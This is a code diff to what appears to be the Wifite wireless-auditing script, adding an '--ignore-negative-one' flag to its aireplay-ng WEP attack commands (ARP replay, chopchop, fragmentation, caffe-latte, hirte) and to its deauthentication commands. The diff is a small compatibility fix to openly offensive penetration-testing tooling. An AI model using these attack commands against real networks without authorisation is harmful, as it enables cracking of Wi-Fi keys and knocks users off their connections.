@@ -88,7 +88,7 @@ from subprocess import call
 # GLOBAL VARIABLES IN ALL CAPS #
 ################################
 
-REVISION = 112
+REVISION = 113
 
 
 # WPA variables
@@ -2821,6 +2821,7 @@ def get_aireplay_command(iface, attack_num, target, clients, client_mac):
 	cmd = ''
 	if attack_num == 0:
 		cmd = ['aireplay-ng',
+		       '--ignore-negative-one',
 		       '--arpreplay',
 		       '-b', target.bssid,
 		       '-x', str(WEP_PPS)] # Packets per second
@@ -2834,6 +2835,7 @@ def get_aireplay_command(iface, attack_num, target, clients, client_mac):
 		
 	elif attack_num == 1:
 		cmd = ['aireplay-ng',
+		       '--ignore-negative-one',
 		       '--chopchop',
 		       '-b', target.bssid,
 		       '-x', str(WEP_PPS), # Packets per second
@@ -2850,6 +2852,7 @@ def get_aireplay_command(iface, attack_num, target, clients, client_mac):
 		
 	elif attack_num == 2:
 		cmd = ['aireplay-ng',
+		       '--ignore-negative-one',
 		       '--fragment',
 		       '-b', target.bssid,
 		       '-x', str(WEP_PPS), # Packets per second
@@ -2865,6 +2868,7 @@ def get_aireplay_command(iface, attack_num, target, clients, client_mac):
 	
 	elif attack_num == 3:
 		cmd = ['aireplay-ng',
+		       '--ignore-negative-one',
 		       '--caffe-latte',
 		       '-b', target.bssid]
 		if len(clients) > 0:
@@ -2874,6 +2878,7 @@ def get_aireplay_command(iface, attack_num, target, clients, client_mac):
 		
 	elif attack_num == 4:
 		cmd = ['aireplay-ng',
+		       '--ignore-negative-one',
 		       '--interactive',
 		       '-b', target.bssid,
 		       '-c', 'ff:ff:ff:ff:ff:ff',
@@ -2888,6 +2893,7 @@ def get_aireplay_command(iface, attack_num, target, clients, client_mac):
 			print R+' [0:00:00] unable to carry out hirte attack: '+O+'no clients'
 			return ''
 		cmd = ['aireplay-ng',
+		       '--ignore-negative-one',
 		       '--cfrag',
 		       '-h', clients[0].bssid,
 		       iface]
@@ -2901,6 +2907,7 @@ def wep_send_deauths(iface, target, clients):
 	"""
 	# Send deauth to broadcast
 	cmd = ['aireplay-ng',
+	       '--ignore-negative-one',
 	       '--deauth', '1',
 	       '-a', target.bssid,
 	       iface]
@@ -2908,6 +2915,7 @@ def wep_send_deauths(iface, target, clients):
 	# Send deauth to every client
 	for client in clients:
 		cmd = ['aireplay-ng',
+			     '--ignore-negative-one',
 			     '--deauth', '1',
 			     '-a', target.bssid,
 			     '-h', client.bssid,
